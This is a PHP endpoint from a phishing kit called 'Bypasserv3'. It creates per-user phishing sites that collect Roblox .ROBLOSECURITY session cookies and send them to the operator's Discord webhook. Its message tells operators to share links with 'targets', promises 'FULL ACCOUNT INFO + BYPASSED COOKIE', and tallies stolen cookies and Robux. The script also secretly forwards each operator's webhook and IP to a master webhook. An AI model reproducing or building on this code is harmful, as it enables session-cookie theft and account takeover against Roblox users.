<?php
/**
 * Bypasserv3 - Instance Creator
 * Sends master admin notification when someone creates a site
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// ============================================
// METHOD CHECK
// ============================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// ============================================
// PARSE INPUT
// ============================================
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

$directory = sanitizeDirectory($input['directory'] ?? '');
$webhook = trim($input['webhook'] ?? '');
$username = 'Bypasserv3';
$profilePicture = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';

// ============================================
// VALIDATION
// ============================================

// Directory validation
if (empty($directory) || strlen($directory) < 3) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
    exit;
}

if (strlen($directory) > 32) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 32 characters']);
    exit;
}

if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory can only contain letters, numbers, hyphens, and underscores']);
    exit;
}

if (directoryExists($directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
    exit;
}

// Webhook validation
if (empty($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
    exit;
}

if (!validateWebhook($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
    exit;
}

// ============================================
// RATE LIMITING
// ============================================
$clientIP = getUserIP();
if (!checkRateLimit($clientIP, 10, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
    exit;
}

// ============================================
// GENERATE TOKEN
// ============================================
$token = generateToken();

// ============================================
// CREATE INSTANCE DATA
// ============================================
$instanceData = [
    'directory' => $directory,
    'webhook' => MASTER_WEBHOOK,
    'userWebhook' => $webhook,
    'username' => $username,
    'profilePicture' => $profilePicture,
    'token' => $token,
    'createdAt' => date('c'),
    'createdIP' => $clientIP,
    'stats' => [
        'totalVisits' => 0,
        'totalCookies' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0
    ],
    'dailyStats' => [
        'visits' => array_fill(0, 7, 0),
        'cookies' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ]
];

// ============================================
// SAVE INSTANCE
// ============================================
if (!saveInstance($directory, $instanceData)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
    exit;
}

// ============================================
// SAVE TOKEN
// ============================================
$tokenData = [
    'token' => $token,
    'directory' => $directory,
    'webhook' => $webhook,
    'username' => $username,
    'createdAt' => date('c'),
    'createdIP' => $clientIP
];

$tokenHash = md5($token);
$tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';

if (!file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT))) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to save token']);
    exit;
}

// ============================================
// UPDATE GLOBAL STATS
// ============================================
updateGlobalStats('totalInstances', 1);

// ============================================
// LOG CREATION
// ============================================
logSecurityEvent('instance_created', [
    'directory' => $directory,
    'token' => substr($token, 0, 8) . '...',
    'ip' => $clientIP
]);

// ============================================
// BUILD URLS
// ============================================
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$baseUrl = $protocol . '://' . $domain;
$instanceUrl = $baseUrl . '/public/?dir=' . $directory;

// ============================================
// SEND MASTER ADMIN BOT NOTIFICATION
// ============================================
if (!empty(MASTER_WEBHOOK)) {
    $masterWebhookData = [
        'username' => 'Master Admin Bot',
        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
        'embeds' => [
            [
                'title' => '🆕 New Site Generated',
                'description' => "**Instance:** `{$directory}`",
                'color' => hexdec('5865F2'),
                'fields' => [
                    [
                        'name' => '🔗 Link',
                        'value' => "{$instanceUrl}\n({$instanceUrl})",
                        'inline' => false
                    ],
                    [
                        'name' => '🌐 IP',
                        'value' => "`{$clientIP}`",
                        'inline' => false
                    ],
                    [
                        'name' => '👤 User Webhook',
                        'value' => "{$webhook}",
                        'inline' => false
                    ]
                ],
                'footer' => [
                    'text' => 'Today at ' . date('g:i A')
                ]
            ]
        ]
    ];
    
    sendWebhook(MASTER_WEBHOOK, $masterWebhookData);
}

// ============================================
// SEND USER WEBHOOK NOTIFICATION
// ============================================
$webhookData = [
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => 'Site Generated Successfully!',
            'description' => "Your bypass site **{$directory}** is ready to collect cookies!",
            'color' => hexdec('22c55e'),
            'fields' => [
                [
                    'name' => '📁 Site Name',
                    'value' => "```{$directory}```",
                    'inline' => false
                ],
                [
                    'name' => '🔗 Your Link',
                    'value' => "```{$instanceUrl}```\n[Click to Open]({$instanceUrl})",
                    'inline' => false
                ],
                [
                    'name' => '✅ Features Included',
                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
                    'inline' => false
                ],
                [
                    'name' => '📋 How It Works',
                    'value' => "1️⃣ Share your link with targets\n2️⃣ They submit their `.ROBLOSECURITY` cookie\n3️⃣ Cookie is automatically **Bypassed**\n4️⃣ You receive **FULL ACCOUNT INFO + BYPASSED COOKIE**\n5️⃣ Master log sent to admin",
                    'inline' => false
                ]
            ],
            'footer' => [
                'text' => 'Bypasserv3 Generator • ' . date('M d, Y')
            ],
            'timestamp' => date('c'),
            'thumbnail' => [
                'url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png'
            ]
        ]
    ]
];

sendWebhook($webhook, $webhookData);

// ============================================
// RETURN SUCCESS RESPONSE (NO DASHBOARD)
// ============================================
http_response_code(201);
echo json_encode([
    'success' => true,
    'directory' => $directory,
    'instanceUrl' => $instanceUrl,
    'message' => 'Instance created successfully'
]);
?>
